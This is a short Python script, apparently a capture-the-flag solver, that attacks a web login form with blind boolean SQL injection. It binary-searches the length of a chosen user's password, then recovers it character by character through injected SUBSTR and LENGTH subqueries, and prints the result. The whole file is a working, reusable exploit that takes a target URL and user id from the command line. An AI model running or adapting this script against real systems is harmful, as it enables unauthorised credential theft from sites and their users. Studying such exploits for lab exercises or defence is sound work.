#!/usr/bin/python3
import sys
from urllib.parse import urljoin
import requests

class Solver:
    def __init__(self, url: str) -> None:
        self._index_url = url
        self._login_url = urljoin(self._index_url, 'login')
    
    def _login(self, uid: str, upw: str) -> requests.Response:
        login_data = {
            'userid': uid,
            'userpassword': upw
        }
        resp = requests.post(self._login_url, login_data)
        return resp

    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f'" OR {query} --', 'dummy')
        return resp

    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while True:
            mid = (low + high) // 2
            if low + 1 >= high:
                break

            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid

    def _find_pw_len(self, uid: str, max_pw_len: int = 100) -> int:
        query_tmpl = f''' (
            (
                SELECT LENGTH(userpassword)
                FROM users
                WHERE 1=1
                    AND userid = "{uid}"
            ) < {{val}}
        ) '''
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len

    def _find_pw(self, uid: str, pw_len: int) -> str:
        pw = ''
        for i in range(1, pw_len + 1):
            query_tmpl = f''' (
                (
                    SELECT SUBSTR(userpassword, {i}, 1)
                    FROM users
                    WHERE 1=1
                        AND userid = "{uid}"
                ) < CHAR({{val}})
            ) '''
            pw_i = chr(self._sqli_lt_binsearch(query_tmpl, 0x21, 0x7E))
            pw += pw_i
            print(f'{i:02}. {pw_i}')
        return pw

    def solve(self, uid: str) -> None:
        pw_len = self._find_pw_len(uid)
        print(f'Length of the {uid} password is: {pw_len}')
        
        print('Finding password...')
        pw = self._find_pw(uid, pw_len)
        print(f'Password of the {uid} is: {pw}')
        

if __name__ == '__main__':
    url = sys.argv[1]
    uid = sys.argv[2]

    solver = Solver(url)
    solver.solve(uid)